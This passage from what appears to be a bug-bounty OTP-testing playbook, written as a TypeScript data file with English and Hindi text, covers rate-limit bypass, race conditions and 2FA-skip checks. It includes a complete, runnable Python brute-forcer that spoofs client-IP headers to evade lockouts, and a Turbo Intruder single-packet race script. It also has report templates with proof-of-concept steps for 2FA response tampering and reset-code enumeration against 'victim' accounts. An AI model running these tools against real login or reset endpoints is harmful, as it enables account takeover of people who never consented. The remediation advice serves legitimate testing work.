      `POST /api/v1/./verify-otp`,
    ],
    keyTargets: [
      "Client IP headers",
      "Path normalization discrepancies",
      "Content-Type switching (JSON vs Form-Data)",
    ],
  },
  {
    phase: 4,
    title: {
      en: "Phase 4: Concurrency & Single-Packet Race Conditions",
      simple: "Phase 4: Beating the Counter with Synchronized Parallel Requests",
      hi: "चरण 4: समानांतर सिंगल-पैकेट रेस कंडीशन का परीक्षण",
    },
    objective: {
      en: "Exploit execution race conditions between reading attempt quotas and writing increments to brute force codes concurrently.",
      simple: "Send multiple guesses at the exact same instant to bypass the 3-try rule.",
      hi: "एक साथ कई रिक्वेस्ट भेजकर 3-प्रयास की सीमा को पार करना।",
    },
    steps: [
      {
        en: "Group 30-50 OTP guess requests in Burp Repeater or Turbo Intruder.",
        simple: "Group 30 to 50 guesses together in Burp.",
        hi: "Burp में 30 से 50 रिक्वेस्ट का ग्रुप बनाएं।",
      },
      {
        en: "Use HTTP/2 Single-Packet Attack to synchronize request departure.",
        simple: "Use the single-packet attack feature to send them all in one go.",
        hi: "सिंगल-पैकेट अटैक से सभी रिक्वेस्ट एक ही पल में भेजें।",
      },
      {
        en: "Verify how many requests are evaluated before the lockout applies.",
        simple: "See how many guesses got checked without being blocked.",
        hi: "देखें कि कितनी रिक्वेस्ट बिना रुकावट के प्रोसेस हुईं।",
      },
    ],
    commandsOrPayloads: [
      `engine.openGate('race')`,
      `Repeater -> Send group in parallel (single-packet attack)`,
    ],
    keyTargets: [
      "HTTP/2 multiplexed streams",
      "Database counter read/write delays",
      "Password reset token verification",
    ],
  },
  {
    phase: 5,
    title: {
      en: "Phase 5: Session Binding & 2FA Enforcement Checks",
      simple: "Phase 5: Cross-Account Tests and Skipping 2FA Directly",
      hi: "चरण 5: सेशन बाइंडिंग और सीधे 2FA स्किप करने की जांच",
    },
    objective: {
      en: "Ensure OTPs are strictly bound to the requesting user session and verify that core backend APIs actively enforce 2FA verification status.",
      simple: "Check if you can use your own code on someone else's account or skip the 2FA screen completely.",
      hi: "जांचें कि क्या अपना OTP दूसरे के अकाउंट में काम करता है या 2FA स्क्रीन को सीधे छोड़ा जा सकता है।",
    },
    steps: [
      {
        en: "Cross-Account test: request code on Account A, submit on Account B.",
        simple: "Try submitting code from Account A on Account B.",
        hi: "अकाउंट A का कोड अकाउंट B पर डालकर देखें।",
      },
      {
        en: "Direct endpoint access: query authenticated APIs with pre-2FA session cookie.",
        simple: "Access internal links using the login cookie before entering 2FA.",
        hi: "2FA पूरा किए बिना प्राइवेट API लिंक्स खोलकर देखें।",
      },
      {
        en: "Social login bypass: check if 'Login with Google' skips 2FA enforcement.",
        simple: "Check if Google login skips the 2FA prompt.",
        hi: "जांचें कि क्या गूगल लॉगिन से 2FA स्किप हो जाता है।",
      },
    ],
    commandsOrPayloads: [
      `GET /api/v1/dashboard HTTP/1.1 -H 'Cookie: pre_2fa_session=...'`,
      `POST /api/v1/auth/google/callback`,
    ],
    keyTargets: [
      "Session binding (user_id vs otp)",
      "API authorization middleware",
      "Social OAuth login bypasses",
    ],
  },
];

// ─── 3. AUTOMATION SCRIPTS & TOOLS STASH ──────────────────────────────────────
export const OTP_TOOLS_STASH: OtpToolSnippet[] = [
  {
    id: "otp-rate-limit-rotator",
    title: {
      en: "Automated OTP Brute-Forcer with Header & Path Rotation",
      simple: "Python Script to Test OTPs While Automatically Changing Fake IPs",
      hi: "ऑटोमेटेड OTP ब्रूट-फोर्सर (हेडर और IP रोटेशन के साथ)",
    },
    description: {
      en: "Python script that attempts 4-digit or 6-digit OTP codes while constantly mutating the client IP via 'X-Forwarded-For' and cycling through path variants to avoid rate limits.",
      simple: "A Python tool that tests OTP codes while pretending to be a new computer on every single try.",
      hi: "यह पायथन टूल हर प्रयास में नया IP लगाकर OTP टेस्ट करता है ताकि आप कभी ब्लॉक न हों।",
    },
    category: "python_fuzzer",
    language: "python",
    code: `#!/usr/bin/env python3
"""
OTP Rate-Limit & Brute-Force Evasion Tool
Automatically rotates client IP headers and path mutations on every attempt.
"""

import sys
import random
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_random_ip():
    return f"{random.randint(11, 199)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

def brute_force_otp(target_url, email, start_range=0, end_range=9999):
    print(f"[*] Target: {target_url}")
    print(f"[*] Attacking Email: {email}")
    print(f"[*] Testing Range: {start_range:04d} to {end_range:04d}\\n")

    for code in range(start_range, end_range + 1):
        otp_str = f"{code:04d}"
        spoofed_ip = generate_random_ip()

        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": spoofed_ip,
            "X-Real-IP": spoofed_ip,
            "X-Originating-IP": spoofed_ip,
            "Client-IP": spoofed_ip,
            "User-Agent": "Mozilla/5.0 (Security-Audit-Check)"
        }

        payload = {
            "email": email,
            "otp": otp_str
        }

        try:
            resp = requests.post(target_url, json=payload, headers=headers, verify=False, timeout=5)
            
            if resp.status_code == 200 and ("success" in resp.text.lower() or "token" in resp.text.lower()):
                print(f"\\n\\033[1;32m[+] CRITICAL: VALID OTP FOUND! Code: {otp_str}\\033[0m")
                print(f"    Server Response: {resp.text}")
                return
            elif resp.status_code == 429:
                print(f"[-] Rate limit hit at code {otp_str}. Server ignored IP headers.")
            else:
                sys.stdout.write(f"\\r[*] Testing code: {otp_str} | IP: {spoofed_ip} | Status: {resp.status_code}")
                sys.stdout.flush()

        except Exception as e:
            print(f"\\n[!] Request error on code {otp_str}: {e}")

    print("\\n[*] Finished testing range.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <verify_url> <email> [start_code] [end_code]")
        print(f"Example: {sys.argv[0]} https://target.com/api/verify test@target.com 0 1000")
        sys.exit(1)

    start = int(sys.argv[3]) if len(sys.argv) > 3 else 0
    end = int(sys.argv[4]) if len(sys.argv) > 4 else 9999
    brute_force_otp(sys.argv[1], sys.argv[2], start, end)`,
    howToUse: {
      en: "Run: `python3 otp_fuzzer.py https://target.com/api/v1/verify victim@target.com 0000 9999`",
      simple: "Run the script with your target endpoint and email to test all codes with IP rotation.",
      hi: "`python3 otp_fuzzer.py <URL> <ईमेल> 0000 9999` लिखकर चलाएं।",
    },
  },
  {
    id: "turbo-intruder-single-packet-race",
    title: {
      en: "Turbo Intruder HTTP/2 Single-Packet Race Condition Script",
      simple: "Turbo Intruder Python Code to Send 50 OTPs at the Exact Same Millisecond",
      hi: "Turbo Intruder सिंगल-पैकेट रेस कंडीशन स्क्रिप्ट",
    },
    description: {
      en: "Python script designed specifically for Burp Suite's Turbo Intruder extension to execute an HTTP/2 Single-Packet Attack against OTP verification endpoints.",
      simple: "Script for Burp Turbo Intruder to send 50 OTPs at the exact same instant to bypass attempt limits.",
      hi: "Burp Turbo Intruder में 50 OTP एक साथ भेजकर 3-प्रयास लिमिट को बाईपास करने वाली स्क्रिप्ट।",
    },
    category: "burp_rules",
    language: "python",
    code: `def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2,
                           requestsPerConnection=100,
                           pipeline=False)

    # 1. Queue 50 different OTP guesses behind a gate
    for i in range(1000, 1050):
        req = target.req.replace('%s', str(i))
        engine.queue(req, gate='race1')

    # 2. Open the gate to release all 50 requests in the exact same TCP packet
    engine.openGate('race1')

def handleResponse(req, category):
    # Highlight successful verification or non-400 status codes
    if req.status != 400 and req.status != 429:
        table.add(req)`,
    howToUse: {
      en: "Send request to Turbo Intruder in Burp -> Paste this script -> Replace OTP value with `%s` -> Start attack.",
      simple: "Paste into Turbo Intruder in Burp Suite and click Start.",
      hi: "Burp Turbo Intruder में पेस्ट करें, OTP की जगह `%s` लगाएं और स्टार्ट करें।",
    },
  },
];

// ─── 4. HIGH-YIELD BUG BOUNTY REPORT TEMPLATES ───────────────────────────────
export const OTP_REPORT_TEMPLATES: OtpReportTemplate[] = [
  {
    id: "response-tampering-2fa-p1",
    title: {
      en: "P1 / Critical: Full Two-Factor Authentication (2FA) Bypass via HTTP Response Status Tampering",
      simple: "P1: Complete 2FA Bypass by Modifying Server Response",
      hi: "P1 / क्रिटिकल: रिस्पॉन्स मैनिपुलेशन से 2FA सुरक्षा का पूर्ण बाईपास",
    },
    vulnType: "Authentication Bypass / Broken Access Control",
    cvss: "9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)",
    severity: "critical",
    reportMarkdown: `## Summary
During testing of the authentication workflow on **{TARGET_DOMAIN}**, a critical Two-Factor Authentication (2FA) bypass was discovered on the \`/api/v1/auth/verify-2fa\` endpoint.

The client application (web portal) relies exclusively on the HTTP status code and response body boolean values to confirm 2FA verification. By intercepting the server's response to an invalid OTP and modifying the response from \`HTTP 401 Unauthorized\` (\`{"verified": false}\`) to \`HTTP 200 OK\` (\`{"verified": true}\`), an attacker can log into any user's account without possessing their physical 2FA device or SMS code.

## Vulnerability Details
- **Vulnerable Endpoint:** \`POST https://{TARGET_DOMAIN}/api/v1/auth/verify-2fa\`
- **Vulnerability Type:** CWE-287: Improper Authentication
- **Impact:** Complete bypass of 2FA protection; immediate account takeover given valid primary credentials.

## Step-by-Step Proof of Concept (PoC)

1. Navigate to the login page \`https://{TARGET_DOMAIN}/login\` and enter valid username and password credentials.
2. The browser presents the 2FA challenge screen requesting a 6-digit authenticator code.
3. Configure Burp Suite to intercept server responses: **Proxy -> Intercept -> Action -> Do Intercept -> Response to this request**.
4. Enter an invalid OTP code (e.g. \`000000\`) and click **Verify**.
5. In Burp Suite, observe the outgoing request and forward it:
\`\`\`http
POST /api/v1/auth/verify-2fa HTTP/1.1
Host: {TARGET_DOMAIN}
Content-Type: application/json

{"user_id": "{VICTIM_USER_ID}", "code": "000000"}
\`\`\`
6. The incoming server response arrives:
\`\`\`http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"status": "error", "verified": false, "message": "Invalid authentication code"}
\`\`\`
7. Modify the response before forwarding to the browser:
\`\`\`http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "success", "verified": true, "message": "Authenticated"}
\`\`\`
8. Forward the response. The browser immediately transitions away from the 2FA screen and opens the authenticated dashboard (\`https://{TARGET_DOMAIN}/dashboard\`) with full account access.

## Impact
Two-Factor Authentication is intended to provide critical defense-in-depth against credential theft and phishing. Because the backend fails to enforce cryptographic session validation, the 2FA layer provides zero protection for users, allowing complete unauthorized account takeover.

## Remediation
1. **Server-Side Session State Transition:** Do not allow the frontend to dictate authentication state. The server must hold the session in a temporary 'unverified' state until a valid OTP is cryptographically verified against the server-side secret.
2. **Issue Final Session Token Only on Valid Code:** Issue the final authorization JWT or session cookie *only* in the HTTP response of a genuinely successful OTP verification.
3. **Never Trust Client-Side Redirection:** Ensure all private API endpoints explicitly check that the user's session has the \`is_2fa_verified = true\` claim before serving data.`,
  },
  {
    id: "missing-rate-limit-otp-p1",
    title: {
      en: "P1 / Critical: Missing Rate Limit on 4-Digit Password Reset OTP Leading to Full Account Takeover",
      simple: "P1: No Rate Limit on 4-Digit Reset Code Allowing Full Account Takeover",
      hi: "P1 / क्रिटिकल: 4-डिजिट OTP पर रेट लिमिट न होने से पूर्ण अकाउंट टेकओवर",
    },
    vulnType: "Brute Force / Insufficient Anti-Automation",
    cvss: "8.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
    severity: "critical",
    reportMarkdown: `## Summary
A critical anti-automation failure was identified on the password reset OTP verification endpoint at \`https://{TARGET_DOMAIN}/api/v1/password-reset/verify\`.

The application generates a 4-digit numeric OTP (possessing only 10,000 possible permutations from \`0000\` to \`9999\`) valid for 15 minutes. Crucially, the verification endpoint enforces no rate limiting or IP throttling, permitting an attacker to enumerate all 10,000 combinations in under 2 minutes and reset the password of any target account.

## Technical Details
- **Endpoint:** \`POST https://{TARGET_DOMAIN}/api/v1/password-reset/verify\`
- **Payload Space:** 10,000 possibilities (4 digits)
- **Observed Rate Limit:** Unlimited (1,000 requests per 10 seconds tested without throttling or lockout)

## Proof of Concept

\`\`\`bash
# Trigger password reset for victim account
curl -X POST "https://{TARGET_DOMAIN}/api/v1/password-reset/request" \\
  -H "Content-Type: application/json" \\
  -d '{"email": "victim@target.com"}'

# Brute force 4-digit space via Turbo Intruder or python script
python3 otp_fuzzer.py "https://{TARGET_DOMAIN}/api/v1/password-reset/verify" "victim@target.com" 0000 9999
\`\`\`

When the valid code is reached, the server responds with a valid password reset token:
\`\`\`http
HTTP/1.1 200 OK
Content-Type: application/json

{"success": true, "reset_token": "eyJhbGciOiJIUzI1NiIsIn..."}
\`\`\`

## Remediation
1. **Increase OTP Complexity:** Upgrade OTPs to at least 6 numeric digits (1,000,000 permutations) or 8 alphanumeric characters.
2. **Strict Attempt Limit:** Invalidate the OTP after 3 to 5 failed verification attempts and require a new reset request.
3. **Server-Side Rate Limiting:** Enforce strict rate limits based on both target email/account ID and client IP address in Redis.
4. **Shorten Lifespan:** Reduce OTP expiration from 15 minutes to 3-5 minutes.`,
  },
];
